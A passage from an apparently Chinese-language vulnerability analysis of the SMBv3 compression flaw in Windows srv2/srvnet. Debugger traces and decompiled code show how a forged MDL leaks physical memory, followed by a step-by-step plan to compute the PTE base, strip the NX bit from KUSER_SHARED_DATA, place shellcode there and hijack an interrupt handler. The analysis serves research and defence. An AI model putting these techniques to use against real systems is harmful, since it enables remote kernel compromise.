           (1 &lt;&lt; (v3 + 0xC)) + 0x100,
           0x3030534C,
           v6,
           0x6662534Cu);
    *v0 = v4;
    if ( !v4 )
      break;
    ++v3;
    ++v0;
    if ( v3 &gt;= 9 )
      return 0i64;
  `}`
```

以下为对SRVNET_BUFFER_HDR结构的初始化过程，v7为 length（满足 (1 &lt;&lt; (index + 0xC)) + 0x100 条件）+ 0xE8（SRVNET_BUFFER_HDR结构长度+8+0x50）+ 2 * (MDL + 8)，其中MDL结构大小和length+0xE8相关，后面会介绍。然后通过ExAllocatePoolWithTag函数分配v7大小的内存，根据偏移获取UserBufferPtr（偏移0x50）、SRVNET_BUFFER_HDR（偏移0x50加length，8字节对齐）等地址，具体如下，不一一介绍。

```
//SrvNetAllocateBufferFromPool
  v8 = (BYTE *)ExAllocatePoolWithTag((POOL_TYPE)0x200, v7, 0x3030534Cu);
  ......
  v11 = (__int64)(v8 + 0x50);
  v12 = (SRVNET_BUFFER_HDR *)((unsigned __int64)&amp;v8[v2 + 0x57] &amp; 0xFFFFFFFFFFFFFFF8ui64);    //v2是length
  v12-&gt;PoolAllocationPtr = v8;
  v12-&gt;pMdl2 = (PMDL)((unsigned __int64)&amp;v12-&gt;unknown3[v5 + 0xF] &amp; 0xFFFFFFFFFFFFFFF8ui64);
  v13 = (_MDL *)((unsigned __int64)&amp;v12-&gt;unknown3[0xF] &amp; 0xFFFFFFFFFFFFFFF8ui64);
  v12-&gt;UserBufferPtr = v8 + 0x50;
  v12-&gt;pMdl1 = v13;
  v12-&gt;BufferFlags = 0;
  v12-&gt;TracingDataCount = 0;
  v12-&gt;UserBufferSizeAllocated = v2;
  v12-&gt;UserBufferSizeUsed = 0;
  v14 = ((_WORD)v8 + 0x50) &amp; 0xFFF;
  v12-&gt;PoolAllocationSize = v7;
  v12-&gt;BytesProcessed = 0;
  v12-&gt;BytesReceived = 0i64;
  v12-&gt;pSrvNetWskStruct = 0i64;
  v12-&gt;SmbFlags = 0;

//SRVNET_BUFFER_HDR 例：
kd&gt; dq rdi
ffffcc0f`76fed150  00000000`00000000 00000000`00000000
ffffcc0f`76fed160  00000000`00000000 ffffcc0f`76fe9050
ffffcc0f`76fed170  00000000`00004100 00000000`000042a8
ffffcc0f`76fed180  ffffcc0f`76fe9000 ffffcc0f`76fed1e0
ffffcc0f`76fed190  00000000`00000000 00000000`00000000
ffffcc0f`76fed1a0  ffffcc0f`76fed240 00000000`00000000
ffffcc0f`76fed1b0  00000000`00000000 00000000`00000000
ffffcc0f`76fed1c0  00000000`00000000 00000000`00000000
```

通过MmSizeOfMdl函数获取MDL结构长度，以下为获取0x41e8长度空间所需的MDL结构长度 ( 0x58 )，其中，0x30为基础长度，0x28存放5个物理页的pfn（0x41e8长度的数据需要存放在5个页）。

```
kd&gt; 
srvnet!SrvNetAllocateBufferFromPool+0x62:
fffff806`2280d2d2 e809120101      call    nt!MmSizeOfMdl (fffff806`2381e4e0)
kd&gt; r rcx
rcx=0000000000000000
kd&gt; r rdx     //0x4100 + 0xe8
rdx=00000000000041e8
kd&gt; p
srvnet!SrvNetAllocateBufferFromPool+0x67:
fffff806`2280d2d7 488d6808        lea     rbp,[rax+8]
kd&gt; r rax    //0x30+0x28
rax=0000000000000058
kd&gt; dt _mdl
nt!_MDL
   +0x000 Next             : Ptr64 _MDL
   +0x008 Size             : Int2B
   +0x00a MdlFlags         : Int2B
   +0x00c AllocationProcessorNumber : Uint2B
   +0x00e Reserved         : Uint2B
   +0x010 Process          : Ptr64 _EPROCESS
   +0x018 MappedSystemVa   : Ptr64 Void
   +0x020 StartVa          : Ptr64 Void
   +0x028 ByteCount        : Uint4B
   +0x02c ByteOffset       : Uint4B
```

MmBuildMdlForNonPagedPool函数调用后，MdlFlags被设置为4，且对应的物理页pfn被写入MDL结构，**然后通过MmMdlPageContentsState函数以及或操作将MdlFlags设置为0x5004（20484）。**

```
kd&gt; 
srvnet!SrvNetAllocateBufferFromPool+0x1b0:
fffff806`2280d420 e8eb220301      call    nt!MmBuildMdlForNonPagedPool (fffff806`2383f710)

kd&gt; dt _mdl @rcx
nt!_MDL
   +0x000 Next             : (null) 
   +0x008 Size             : 0n88
   +0x00a MdlFlags         : 0n0
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : (null) 
   +0x018 MappedSystemVa   : (null) 
   +0x020 StartVa          : 0xffffcc0f`76fe9000 Void
   +0x028 ByteCount        : 0x4100
   +0x02c ByteOffset       : 0x50

kd&gt; dd rcx
ffffcc0f`76fed1e0  00000000 00000000 00000058 00000000
ffffcc0f`76fed1f0  00000000 00000000 00000000 00000000
ffffcc0f`76fed200  76fe9000 ffffcc0f 00004100 00000050
ffffcc0f`76fed210  00000000 00000000 00000000 00000000
ffffcc0f`76fed220  00000000 00000000 00000000 00000000
ffffcc0f`76fed230  00000000 00000000 00000000 00000000
ffffcc0f`76fed240  00000000 00000000 00000000 00000000
ffffcc0f`76fed250  00000000 00000000 00000000 00000000

//flag以及物理页pfn被设置
kd&gt; p
srvnet!SrvNetAllocateBufferFromPool+0x1b5:
fffff806`2280d425 488b4f38        mov     rcx,qword ptr [rdi+38h]
kd&gt; dt _mdl ffffcc0f`76fed1e0
nt!_MDL
   +0x000 Next             : (null) 
   +0x008 Size             : 0n88
   +0x00a MdlFlags         : 0n4
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : (null) 
   +0x018 MappedSystemVa   : 0xffffcc0f`76fe9050 Void
   +0x020 StartVa          : 0xffffcc0f`76fe9000 Void
   +0x028 ByteCount        : 0x4100
   +0x02c ByteOffset       : 0x50
kd&gt; dd ffffcc0f`76fed1e0
ffffcc0f`76fed1e0  00000000 00000000 00040058 00000000
ffffcc0f`76fed1f0  00000000 00000000 76fe9050 ffffcc0f
ffffcc0f`76fed200  76fe9000 ffffcc0f 00004100 00000050
ffffcc0f`76fed210  00041099 00000000 00037d1a 00000000
ffffcc0f`76fed220  00037d9b 00000000 00039c9c 00000000
ffffcc0f`76fed230  00037d1d 00000000 00000000 00000000
ffffcc0f`76fed240  00000000 00000000 00000000 00000000
ffffcc0f`76fed250  00000000 00000000 00000000 00000000

//是正确的物理页
kd&gt; dd ffffcc0f`76fe9000
ffffcc0f`76fe9000  00000000 00000000 00000000 00000000
ffffcc0f`76fe9010  76fe9070 ffffcc0f 00000001 00000000
ffffcc0f`76fe9020  00000001 00000001 76fe9088 ffffcc0f
ffffcc0f`76fe9030  00000008 00000000 00000000 00000000
ffffcc0f`76fe9040  00000000 00000000 76fe90f8 ffffcc0f
ffffcc0f`76fe9050  00000290 00000000 76feb4d8 ffffcc0f
ffffcc0f`76fe9060  00000238 00000000 0000000c 00000000
ffffcc0f`76fe9070  00000018 00000001 eb004a11 11d49b1a
kd&gt; !dd 41099000
#41099000   00000000 00000000 00000000 00000000
#41099010   76fe9070 ffffcc0f 00000001 00000000
#41099020   00000001 00000001 76fe9088 ffffcc0f
#41099030   00000008 00000000 00000000 00000000
#41099040   00000000 00000000 76fe90f8 ffffcc0f
#41099050   00000290 00000000 76feb4d8 ffffcc0f
#41099060   00000238 00000000 0000000c 00000000
#41099070   00000018 00000001 eb004a11 11d49b1a
```

### <a class="reference-link" name="%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E8%AF%BB"></a>物理地址读

根据前面的介绍可知，SRVNET BUFFER HDR结构体中存放了两个MDL结构（Memory Descriptor List，内存描述符列表）指针，分别位于其0x38和0x50偏移处，MDL维护缓冲区的物理地址信息，以下为某个请求结构的第一个MDL：

```
2: kd&gt; dt _mdl poi(rax+38)
nt!_MDL
   +0x000 Next             : (null) 
   +0x008 Size             : 0n64
   +0x00a MdlFlags         : 0n20484
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : (null) 
   +0x018 MappedSystemVa   : 0xffffae8d`0cfe3050 Void
   +0x020 StartVa          : 0xffffae8d`0cfe3000 Void
   +0x028 ByteCount        : 0x1100
   +0x02c ByteOffset       : 0x50

2: kd&gt; dd poi(rax+38)
ffffae8d`0cfe41e0  00000000 00000000 50040040 00000000
ffffae8d`0cfe41f0  00000000 00000000 0cfe3050 ffffae8d
ffffae8d`0cfe4200  0cfe3000 ffffae8d 00001100 00000050
ffffae8d`0cfe4210  0004a847 00000000 00006976 00000000
ffffae8d`0cfe4220  00000000 00000000 00000000 00000000
ffffae8d`0cfe4230  00040040 00000000 00000000 00000000
ffffae8d`0cfe4240  00000000 00000000 0cfe3000 ffffae8d
ffffae8d`0cfe4250  00001100 00000050 00000000 00000000
```

0xFFFFAE8D0CFE3000映射自物理页4A847 ，0xFFFFAE8D0CFE4000映射自物理页6976。和上面MDL结构可以对应起来。

```
3: kd&gt; !pte 0xffffae8d`0cfe3000
                                           VA ffffae8d0cfe3000
PXE at FFFFF6FB7DBEDAE8    PPE at FFFFF6FB7DB5D1A0    PDE at FFFFF6FB6BA34338    PTE at FFFFF6D746867F18
contains 0A000000013BE863  contains 0A000000013C1863  contains 0A00000020583863  contains 8A0000004A847B63
pfn 13be      ---DA--KWEV  pfn 13c1      ---DA--KWEV  pfn 20583     ---DA--KWEV  pfn 4a847     CG-DA--KW-V

3: kd&gt; !pte 0xffffae8d`0cfe4000
                                           VA ffffae8d0cfe4000
PXE at FFFFF6FB7DBEDAE8    PPE at FFFFF6FB7DB5D1A0    PDE at FFFFF6FB6BA34338    PTE at FFFFF6D746867F20
contains 0A000000013BE863  contains 0A000000013C1863  contains 0A00000020583863  contains 8A00000006976B63
pfn 13be      ---DA--KWEV  pfn 13c1      ---DA--KWEV  pfn 20583     ---DA--KWEV  pfn 6976      CG-DA--KW-V
```

在Srv2DecompressData函数中，如果解压失败，就会调用SrvNetFreeBuffer，在这个函数中对不需要的缓冲区进行一些处理之后将其放回SrvNetBufferLookasides表，但没有对User Buffer区域以及MDL相关数据进行处理，后面再用到的时候会直接取出来用（前面分析过），存在数据未初始化的隐患。如下所示，在nt!ExpInterlockedPushEntrySList函数被调用后，伪造了pMDL1指针的SRVNET BUFFER HDR结构体指针被放入SrvNetBufferLookasides。

```
//Srv2DecompressData
    NTSTATUS Status = SmbCompressionDecompress(
        Header-&gt;CompressionAlgorithm,
        (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header-&gt;Offset,
        (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header-&gt;Offset),
        (PUCHAR)Alloc-&gt;UserBuffer + Header-&gt;Offset,
        Header-&gt;OriginalCompressedSegmentSize,
        &amp;FinalCompressedSize);
    if (Status &lt; 0 || FinalCompressedSize != Header-&gt;OriginalCompressedSegmentSize) `{`
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    `}`

3: kd&gt; dq poi(poi(SrvNetBufferLookasides)+20)
ffffae8d`0bbb54c0  ffffae8d`0bbddbc0 ffffae8d`0bbdd980
ffffae8d`0bbb54d0  ffffae8d`0bbdd7c0 ffffae8d`0bbdd640
ffffae8d`0bbb54e0  ffffae8d`0bbdd140 0005d2a7`00000014
ffffae8d`0bbb54f0  0002974b`0003d3e0 00000064`00005000
ffffae8d`0bbb5500  52777445`0208f200 0006f408`0006f3f3
ffffae8d`0bbb5510  ffffae8d`0586bb58 ffffae8d`0bbb5f10
ffffae8d`0bbb5520  ffffae8d`0bbb5520 ffffae8d`0bbb5520
ffffae8d`0bbb5530  ffffae8d`0586bb20 00000000`00000000

3: kd&gt; p
srvnet!SrvNetFreeBuffer+0x18b:
fffff800`494758ab ebcf            jmp     srvnet!SrvNetFreeBuffer+0x15c (fffff800`4947587c)

3: kd&gt; dq ffffae8d`0bbdd140
ffffae8d`0bbdd140  00000000`00130002 ffffae8d`0dbf6150
ffffae8d`0bbdd150  0000001a`01000004 00000013`0000000d
ffffae8d`0bbdd160  00000200`00000000 00001100`3030534c
ffffae8d`0bbdd170  fffff800`4947d600 fffff800`4947d590
ffffae8d`0bbdd180  ffffae8d`0bbdd9c0 ffffae8d`08302ac0
ffffae8d`0bbdd190  00000009`00000016 00000000`00000000
ffffae8d`0bbdd1a0  ffffae8d`0bbddbc0 00000000`00000000
ffffae8d`0bbdd1b0  00000000`00000001 00000000`00000000

3: kd&gt; dq ffffae8d`0dbf6150    //假设伪造了pmdl1指针
ffffae8d`0dbf6150  ffffae8d`0a771150 cdcdcdcd`cdcdcdcd
ffffae8d`0dbf6160  00000003`00000000 ffffae8d`0dbf5050
ffffae8d`0dbf6170  00000000`00001100 00000000`00001278
ffffae8d`0dbf6180  ffffae8d`0dbf5000 fffff780`00000e00
ffffae8d`0dbf6190  00000000`00000000 00000000`00000000
ffffae8d`0dbf61a0  ffffae8d`0dbf6228 00000000`00000000
ffffae8d`0dbf61b0  00000000`00000000 00000000`00000000
ffffae8d`0dbf61c0  00000000`00000000 00000000`00000000
```

ricercasecurity文章中提示可通过伪造MDL结构（设置后面的物理页pfn）来泄露物理内存。在后续处理某些请求时，会从SrvNetBufferLookasides表中取出缓冲区来存放数据，因而数据包有概率分配在被破坏的缓冲区上，由于网卡驱动最终会依赖DMA（Direct Memory Access，直接内存访问）来传输数据包，因而伪造的MDL结构可控制读取有限的数据。如下所示，Smb2ExecuteNegotiateReal函数在处理SMB协商的过程中又从SrvNetBufferLookasides中获取到了被破坏的缓冲区，其pMDL1指针已经被覆盖为伪造的MDL结构地址0xfffff78000000e00，该结构偏移0x30处的物理页被指定为0x1aa。

```
3: kd&gt; dd fffff78000000e00    //伪造的MDL结构
fffff780`00000e00  00000000 00000000 50040040 0b470280
fffff780`00000e10  00000000 00000000 00000050 fffff780
fffff780`00000e20  00000000 fffff780 00001100 00000008
fffff780`00000e30  000001aa 00000000 00000001 00000000

3: kd&gt; k
 # Child-SP          RetAddr               Call Site
00 ffffd700`634cf870 fffff800`494767de     nt!ExpInterlockedPopEntrySListResume+0x7
01 ffffd700`634cf880 fffff800`44d24de6     srvnet!SrvNetAllocateBuffer+0x9e
02 ffffd700`634cf8d0 fffff800`44d3d584     srv2!Srv2AllocateResponseBuffer+0x1e
03 ffffd700`634cf900 fffff800`44d29a9f     srv2!Smb2ExecuteNegotiateReal+0x185f4
04 ffffd700`634cfad0 fffff800`44d2989a     srv2!RfspThreadPoolNodeWorkerProcessWorkItems+0x13f
05 ffffd700`634cfb50 fffff800`457d9037     srv2!RfspThreadPoolNodeWorkerRun+0x1ba
06 ffffd700`634cfbb0 fffff800`45128ce5     nt!IopThreadStart+0x37
07 ffffd700`634cfc10 fffff800`452869ca     nt!PspSystemThreadStartup+0x55
08 ffffd700`634cfc60 00000000`00000000     nt!KiStartSystemThread+0x2a

3: kd&gt; 
srv2!Smb2ExecuteNegotiateReal+0x592:
fffff800`44d25522 498b86f8000000  mov     rax,qword ptr [r14+0F8h]
3: kd&gt; 
srv2!Smb2ExecuteNegotiateReal+0x599:
fffff800`44d25529 488b5818        mov     rbx,qword ptr [rax+18h]
3: kd&gt; dd rax    //被破坏了的pmdl1指针
ffffae8d`0cfce150  00000000 00000000 005c0073 00750050
ffffae8d`0cfce160  00000002 00000003 0cfcd050 ffffae8d
ffffae8d`0cfce170  00001100 000000c4 00001278 00650076
ffffae8d`0cfce180  0cfcd000 ffffae8d 00000e00 fffff780
ffffae8d`0cfce190  00000000 006f0052 00000000 00000000
ffffae8d`0cfce1a0  0cfce228 ffffae8d 00000000 00000000
ffffae8d`0cfce1b0  00000000 00450054 0050004d 0043003d
ffffae8d`0cfce1c0  005c003a 00730055 00720065 005c0073
```

在后续数据传输过程中会调用hal!HalBuildScatterGatherListV2函数，其会利用MDL结构中的PFN、ByteOffset以及ByteCount来设置_SCATTER_GATHER_ELEMENT结构。然后调用TRANSMIT::MiniportProcessSGList函数（位于e1i65x64.sys，网卡驱动，测试环境）直接传送数据，该函数第三个参数为_SCATTER_GATHER_LIST类型，其两个 _SCATTER_GATHER_ELEMENT结构分别指明了0x3d942c0 和 0x1aa008 （物理地址），如下所示，当函数执行完成后，0x1aa物理页的部分数据被泄露。其中，0x1aa008来自于伪造的MDL结构，计算过程为：(0x1aa &lt;&lt; c) + 8。

```
1: kd&gt; dd r8
ffffae8d`0b454ca0  00000002 ffffae8d 00000001 00000000
ffffae8d`0b454cb0  03d942c0 00000000 00000100 ffffae8d
ffffae8d`0b454cc0  00000000 00000260 001aa008 00000000
ffffae8d`0b454cd0  00000206 00000000 00640064 00730069

1: kd&gt; dt _SCATTER_GATHER_LIST @r8
hal!_SCATTER_GATHER_LIST
   +0x000 NumberOfElements : 2
   +0x008 Reserved         : 1
   +0x010 Elements         : [0] _SCATTER_GATHER_ELEMENT

1: kd&gt; dt _SCATTER_GATHER_ELEMENT ffffae8d`0b454cb0
hal!_SCATTER_GATHER_ELEMENT
   +0x000 Address          : _LARGE_INTEGER 0x3d942c0
   +0x008 Length           : 0x100
   +0x010 Reserved         : 0x00000260`00000000
1: kd&gt; dt _SCATTER_GATHER_ELEMENT ffffae8d`0b454cb0+18
hal!_SCATTER_GATHER_ELEMENT
   +0x000 Address          : _LARGE_INTEGER 0x1aa008
   +0x008 Length           : 0x206
   +0x010 Reserved         : 0x00730069`00640064
```

```
1: kd&gt; !db 0x3d9438a l100
# 3d9438a 00 50 56 c0 00 08 00 0c-29 c9 e3 5d 08 00 45 00 .PV.....)..]..E.
# 3d9439a 02 2e 45 8c 00 00 80 06-00 00 c0 a8 8c 8a c0 a8 ..E.............
# 3d943aa 8c 01 01 bd df c4 e1 1c-22 7e c3 d1 b7 0d 50 18 ........"~....P.
# 3d943ba 20 14 9b fd 00 00 c3 d1-b7 0d 00 00 00 00 00 00  ...............

1: kd&gt; !dd 0x1aa008
#  1aa008 00000000 00000000 00000000 00000000
#  1aa018 00000000 00000000 00000000 00000000
#  1aa028 00000000 00000000 00000000 00000000
#  1aa038 00000000 00000000 00000000 00000000
#  1aa048 00000000 00000000 00000000 00000000
#  1aa058 00000000 00000000 00000000 00000000
#  1aa068 00000000 00000000 00000000 00000000
#  1aa078 00000000 00000000 00000000 00000000
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0124a95c5de658e721.png)

正常的响应包应该是以下这个样子的，这次通过查看MiniportProcessSGList函数第四个参数（_NET_BUFFER类型）来验证，如下所示，此次MDL结构中维护的物理地址（0x4a84704c）和线性地址（0xffffae8d0cfe304c）是一致的：

```
3: kd&gt; dt _NET_BUFFER @r9
ndis!_NET_BUFFER
   +0x000 Next             : (null) 
   +0x008 CurrentMdl       : 0xffffae8d`0ca6ac50 _MDL
   +0x010 CurrentMdlOffset : 0xca
   +0x018 DataLength       : 0x23c
   +0x018 stDataLength     : 0x00010251`0000023c
   +0x020 MdlChain         : 0xffffae8d`0ca6ac50 _MDL
   +0x028 DataOffset       : 0xca
   +0x000 Link             : _SLIST_HEADER
   +0x000 NetBufferHeader  : _NET_BUFFER_HEADER
   +0x030 ChecksumBias     : 0
   +0x032 Reserved         : 5
   +0x038 NdisPoolHandle   : 0xffffae8d`08304900 Void
   +0x040 NdisReserved     : [2] 0xffffae8d`0c2e19a0 Void
   +0x050 ProtocolReserved : [6] 0x00000206`00000100 Void
   +0x080 MiniportReserved : [4] (null) 
   +0x0a0 DataPhysicalAddress : _LARGE_INTEGER 0xff0201cb`ff0201cd
   +0x0a8 SharedMemoryInfo : (null) 
   +0x0a8 ScatterGatherList : (null) 

3: kd&gt; dx -id 0,0,ffffae8d05473040 -r1 ((ndis!_MDL *)0xffffae8d0ca6ac50)
((ndis!_MDL *)0xffffae8d0ca6ac50)                 : 0xffffae8d0ca6ac50 [Type: _MDL *]
    [+0x000] Next             : 0xffffae8d0850d690 [Type: _MDL *]
    [+0x008] Size             : 56 [Type: short]
    [+0x00a] MdlFlags         : 4 [Type: short]
    [+0x00c] AllocationProcessorNumber : 0x2e7 [Type: unsigned short]
    [+0x00e] Reserved         : 0xff02 [Type: unsigned short]
    [+0x010] Process          : 0x0 [Type: _EPROCESS *]
    [+0x018] MappedSystemVa   : 0xffffae8d0ca6ac90 [Type: void *]
    [+0x020] StartVa          : 0xffffae8d0ca6a000 [Type: void *]
    [+0x028] ByteCount        : 0x100 [Type: unsigned long]
    [+0x02c] ByteOffset       : 0xc90 [Type: unsigned long]

3: kd&gt; dx -id 0,0,ffffae8d05473040 -r1 ((ndis!_MDL *)0xffffae8d0850d690)
((ndis!_MDL *)0xffffae8d0850d690)                 : 0xffffae8d0850d690 [Type: _MDL *]
    [+0x000] Next             : 0x0 [Type: _MDL *]
    [+0x008] Size             : 56 [Type: short]
    [+0x00a] MdlFlags         : 16412 [Type: short]
    [+0x00c] AllocationProcessorNumber : 0x3 [Type: unsigned short]
    [+0x00e] Reserved         : 0x0 [Type: unsigned short]
    [+0x010] Process          : 0x0 [Type: _EPROCESS *]
    [+0x018] MappedSystemVa   : 0xffffae8d0cfe304c [Type: void *]
    [+0x020] StartVa          : 0xffffae8d0cfe3000 [Type: void *]
    [+0x028] ByteCount        : 0x206 [Type: unsigned long]
    [+0x02c] ByteOffset       : 0x4c [Type: unsigned long]

3: kd&gt; db 0xffffae8d0cfe304c
ffffae8d`0cfe304c  00 00 02 02 fe 53 4d 42-40 00 00 00 00 00 00 00  .....SMB@.......
ffffae8d`0cfe305c  00 00 01 00 01 00 00 00-00 00 00 00 00 00 00 00  ................
ffffae8d`0cfe306c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffae8d`0cfe307c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffae8d`0cfe308c  00 00 00 00 41 00 01 00-11 03 02 00 66 34 fa 05  ....A.......f4..
ffffae8d`0cfe309c  30 97 9d 49 88 48 f5 78-47 ea 04 38 2f 00 00 00  0..I.H.xG..8/...
ffffae8d`0cfe30ac  00 00 80 00 00 00 80 00-00 00 80 00 02 6b 83 89  .............k..
ffffae8d`0cfe30bc  4b 8b d6 01 00 00 00 00-00 00 00 00 80 00 40 01  K.............@.

3: kd&gt; !db 0x4a84704c
#4a84704c 00 00 02 02 fe 53 4d 42-40 00 00 00 00 00 00 00 .....SMB@.......
#4a84705c 00 00 01 00 01 00 00 00-00 00 00 00 00 00 00 00 ................
#4a84706c 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
#4a84707c 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
#4a84708c 00 00 00 00 41 00 01 00-11 03 02 00 66 34 fa 05 ....A.......f4..
#4a84709c 30 97 9d 49 88 48 f5 78-47 ea 04 38 2f 00 00 00 0..I.H.xG..8/...
#4a8470ac 00 00 80 00 00 00 80 00-00 00 80 00 02 6b 83 89 .............k..
#4a8470bc 4b 8b d6 01 00 00 00 00-00 00 00 00 80 00 40 01 K.............@.
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b1f259ec4cb69685.png)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"></a>漏洞利用流程

1.通过任意地址写伪造MDL结构

2.利用解压缩精准覆盖pMDL1指针，使得压缩数据正好可以解压出伪造的MDL结构地址，但要控制解压失败，避免不必要的后续复制操作覆盖掉重要数据

3.利用前两步读取1aa（1ad）页，寻找自索引值，根据这个值计算PTE base

4.根据PTE BASE和KUSER_SHARED_DATA的虚拟地址计算出该地址的PTE，修改KUSER_SHARED_DATA区域的可执行权限

5.将Shellcode通过任意地址写复制到0xfffff78000000800（属于KUSER_SHARED_DATA）

6.获取halpInterruptController指针以及hal!HalpApicRequestInterrupt指针，利用任意地址写将hal!HalpApicRequestInterrupt指针覆盖为Shellcode地址，将halpInterruptController指针复制到已知区域（以便Shellcode可以找到hal!HalpApicRequestInterrupt函数地址并将halpInterruptController偏移0x78处的该函数指针还原）。hal!HalpApicRequestInterrupt函数是系统一直会调用的函数，劫持了它就等于劫持了系统执行流程。

**计算 PTE BASE：**

使用物理地址读泄露1aa页的数据（测试虚拟机采用BIOS引导），找到其自索引，通过(index &lt;&lt; 39) | 0xFFFF000000000000得到PTE BASE。如下例所示：1aa页自索引为479（0x1DF），因而PTE BASE为(0x1DF &lt;&lt; 39) | 0xFFFF000000000000 = 0xFFFFEF8000000000。

```
0: kd&gt; !dq 1aa000 l1df+1
#  1aa000 8a000000`0de64867 00000000`00000000
#  1aa010 00000000`00000000 00000000`00000000
#  1aa020 00000000`00000000 00000000`00000000
#  ......
#  1aaed0 0a000000`013b3863 00000000`00000000
#  1aaee0 00000000`00000000 00000000`00000000
#  1aaef0 00000000`00000000 80000000`001aa063

1: kd&gt; ?(0x1DF &lt;&lt; 27) | 0xFFFF000000000000
Evaluate expression: -18141941858304 = ffffef80`00000000
```

**计算 KUSER_SHARED_DATA 的 PTE：**

通过 PTE BASE 和 KUSER_SHARED_DATA 的 VA 可以算出KUSER_SHARED_DATA 的 PTE，2017年黑客大会的一篇 PDF 里有介绍。计算过程实际是来源于ntoskrnl.exe中的MiGetPteAddress函数，如下所示，其中0xFFFFF68000000000为未随机化时的PTE BASE，但自Windows 10 1607起 PTE BASE 被随机化，不过幸运的是，这个值可以从MiGetPteAddress函数偏移0x13处获取，系统运行后会将随机化的基址填充到此处（后面一种思路用了这个）：

```
.text:00000001400F1D28 MiGetPteAddress proc near               ; CODE XREF: MmInvalidateDumpAddresses+1B↓p
.text:00000001400F1D28                                         ; MiResidentPagesForSpan+1B↓p ...
.text:00000001400F1D28                 shr     rcx, 9
.text:00000001400F1D2C                 mov     rax, 7FFFFFFFF8h
.text:00000001400F1D36                 and     rcx, rax
.text:00000001400F1D39                 mov     rax, 0FFFFF68000000000h
.text:00000001400F1D43                 add     rax, rcx
.text:00000001400F1D46                 retn
.text:00000001400F1D46 MiGetPteAddress endp

1: kd&gt; u MiGetPteAddress
nt!MiGetPteAddress:
fffff802`045add28 48c1e909        shr     rcx,9
fffff802`045add2c 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
fffff802`045add36 4823c8          and     rcx,rax
fffff802`045add39 48b80000000080efffff mov rax,0FFFFEF8000000000h
fffff802`045add43 4803c1          add     rax,rcx
fffff802`045add46 c3              ret
fffff802`045add47 cc              int     3
fffff802`045add48 cc              int     3
```

在获取了PTE BASE之后可按照以上流程计算某地址的PTE，按照上面的代码计算FFFFF7800000000（KUSER_SHARED_DATA 的起始地址）的PTE为：((FFFFF78000000000 &gt;&gt; 9 ) &amp; 7FFFFFFFF8) + 0xFFFFEF8000000000 = 0xFFFFEFFBC0000000，对比如下输出可知，我们已经成功计算出了FFFFF7800000000对应的PTE。

```
0: kd&gt; !pte fffff78000000000
                                           VA fffff78000000000
PXE at FFFFEFF7FBFDFF78    PPE at FFFFEFF7FBFEF000    PDE at FFFFEFF7FDE00000    PTE at FFFFEFFBC0000000
contains 0000000001300063  contains 0000000001281063  contains 0000000001782063  contains 00000000013B2963
pfn 1300      ---DA--KWEV  pfn 1281      ---DA--KWEV  pfn 1782      ---DA--KWEV  pfn 13b2      -G-DA--KWEV
```

PDF链接：[https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf)

**去NX标志位：**

知道了目标地址的PTE（ 0xFFFFEFFBC0000000），就可以为其去掉NX标志，这样就可以在这个区域执行代码了，思路是利用任意地址写将PTE指向的地址的 NoExecute 标志位修改为0。

```
2: kd&gt; db ffffeffb`c0000006
ffffeffb`c0000006  00 80 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

0: kd&gt; db FFFFEFFBC0000000+6    //修改后
ffffeffb`c0000006  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

```

```
1: kd&gt; dt _MMPTE_HARDWARE FFFFEFFBC0000000
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y1
   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y000000000000000000000001001110110010 (0x13b2)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y1

0: kd&gt; dt _MMPTE_HARDWARE FFFFEFFBC0000000    //修改后
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y1
